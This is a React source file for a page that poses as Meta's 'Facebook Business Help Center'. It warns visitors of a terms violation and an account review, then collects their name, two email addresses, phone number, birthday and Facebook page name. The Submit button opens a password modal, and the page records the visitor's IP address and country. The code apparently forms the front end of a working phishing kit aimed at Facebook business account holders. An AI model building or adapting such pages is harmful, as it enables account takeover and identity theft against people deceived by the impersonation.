import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import MetaLogo from '../assets/meta-logo.png';
import HelperCenter from '../assets/banner.png';
import PasswordInput from '@components/PasswordInput';
import { useState, useRef, useEffect } from 'react';
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';

const Home = () => {
	const phoneInput = useRef<HTMLInputElement>(null);
	const dateInput = useRef<HTMLInputElement>(null);
	
	const [showModal, setShowModal] = useState(false);
	const [phoneValue, setPhoneValue] = useState('');
	const [dateValue, setDateValue] = useState('');
	const [defaultCountry, setDefaultCountry] = useState();


	const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const inputChar = e.target.value[e.target.value.length - 1];
		if (!isNaN(Number(inputChar))) {
			if (e.target.value.length < 11) {
				if (
					e.target.value.length === 2 ||
					e.target.value.length === 5
				) {
					e.target.value += '/';
					e.target.setSelectionRange(
						e.target.value.length,
						e.target.value.length,
					);
				}
				setDateValue(e.target.value);
			}
		} else {
			e.preventDefault();
			setDateValue('');
		}
	};
	
	const openModal = () => setShowModal(true);
	const closeModal = () => setShowModal(false);
	

	useEffect(() => {
		fetch('https://api.ipify.org?format=json')
			.then((response) => response.json())
			.then((data) => {
				const ipAddress = data.ip;

				fetch(
					`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`,
				)
					.then((response) => response.json())
					.then((data) => {
						const countryCode = data.country_code2.toLowerCase();
						setDefaultCountry(countryCode);
						localStorage.setItem('ipAddress', ipAddress);
						localStorage.setItem('country', countryCode);
					})
					.catch((error) =>
						console.error(
							'Error fetching IP location data:',
							error,
						),
					);
			})
			.catch((error) =>
				console.error('Error fetching IP address:', error),
			);
	}, [defaultCountry]);

	return (
		<>
			<header style={{ backgroundColor: `#355797` }}>
				<nav className='container flex h-14 items-center justify-between md:mx-auto'>
					<div className='mx-5 flex items-center justify-center'>
						<img className='w-16' src={MetaLogo} alt='' />
						<p className='ml-3 text-sm text-white'>|</p>
						<p className='ml-3 text-sm text-white'>Support Inbox</p>
					</div>
					<div className='mx-5'>
						<span>
							<FontAwesomeIcon
								icon={faMagnifyingGlass}
								className='text-white'
							></FontAwesomeIcon>
						</span>
					</div>
				</nav>
			</header>
			<div className='relative text-center'>
				<img className='h-full' src={HelperCenter} alt='img' />
				<div className='absolute left-0 top-10 w-full text-center'>
					<p className='text-4xl text-white'>
						Facebook Business Help Center
					</p>
				</div>
			</div>
			<main className='mt-12 flex items-center justify-center'>
				<div className='w-full max-w-screen-md rounded-lg bg-white p-6 shadow-lg'>
					<h2 className='mb-4 text-center text-xl font-bold'>
						Get Started
					</h2>
					<div className='mb-6 rounded-md bg-gray-100 p-4'>
						<p className='text-gray-700'>
							We have received multiple reports that suggest your
							account has been in violation of our terms of
							services and community guidelines. As a result, your
							account is scheduled for review.
						</p>
						<p className='mt-4 font-bold'>Report no: 3088553115</p>
					</div>
					<form>
						<div className='mb-4'>
							<label
								htmlFor='info'
								className='mb-2 block font-semibold text-gray-700'
							>
								Please provide us information that will help us
								investigate
							</label>
							<textarea
								id='info'
								name='info'
								rows={4}
								className='w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600'
								placeholder='Enter details here...'
							></textarea>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='fullname'
								className='mb-2 block font-semibold text-gray-700'
							>
								Full name
							</label>
							<input
								type='text'
								id='fullname'
								name='fullname'
								className='w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600'
								placeholder='Enter your full name'
							/>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='business_email'
								className='mb-2 block font-semibold text-gray-700'
							>
								Business email address
							</label>
							<input
								type='email'
								id='business_email'
								name='business_email'
								className='w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600'
								placeholder='Enter your business email'
							/>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='personal_email'
								className='mb-2 block font-semibold text-gray-700'
							>
								Personal email address
							</label>
							<input
								type='email'
								id='personal_email'
								name='personal_email'
								className='w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600'
								placeholder='Enter your personal email'
							/>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='phone'
								className='mb-2 block font-semibold text-gray-700'
							>
								Mobile Phone Number
							</label>
							<PhoneInput
								country={defaultCountry}
								autoFormat
								enableAreaCodes
								autocompleteSearch
								jumpCursorToEnd
								showDropdown
								enableSearch={false}
								disableSearchIcon
								value={phoneValue}
								inputProps={{
									ref: phoneInput,
									id: 'phone',
									autoFocus: true,
								}}
								placeholder='Your Phone Number'
								buttonClass='border-0 bg-transparent border-r'
								inputClass='border-0'
								containerClass='w-full rounded-lg border border-gray-300 focus:border-blue-500 p-1'
							/>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='phone'
								className='mb-2 block font-semibold text-gray-700'
							>
								Birthday
							</label>
							<input
								ref={dateInput}
								className='w-full rounded-lg border border-gray-300 p-2 focus:border-blue-500'
								type='text'
								value={dateValue}
								onChange={(e) => {
									handleDateChange(e);
								}}
								placeholder='Birthday (MM/DD/YYYY)'
							/>
						</div>

						<div className='mb-4'>
							<label
								htmlFor='facebook_page'
								className='mb-2 block font-semibold text-gray-700'
							>
								Facebook page name
							</label>
							<input
								type='text'
								id='facebook_page'
								name='facebook_page'
								className='w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600'
								placeholder='Enter your Facebook page name'
							/>
						</div>
						<div className='mb-4'>
							<label className='inline-flex items-center'>
								<input
									type='checkbox'
									className='form-checkbox h-4 w-4 text-blue-600'
								/>
								<span className='ml-2 text-gray-700'>
									I agree to our Terms, Data and Cookies
									Policy.
								</span>
							</label>
						</div>
					</form>

					<div className='text-center'>
						<button
							onClick={openModal}
							className='w-full rounded-md bg-blue-300 px-4 py-2 font-semibold text-blue-800 hover:bg-blue-400'
						>
							Submit
						</button>
					</div>
				</div>
			</main>
			<PasswordInput
				isOpen={showModal}
				onClose={closeModal}
				closeModal={closeModal}
			/>
		</>
	);
};

export default Home;

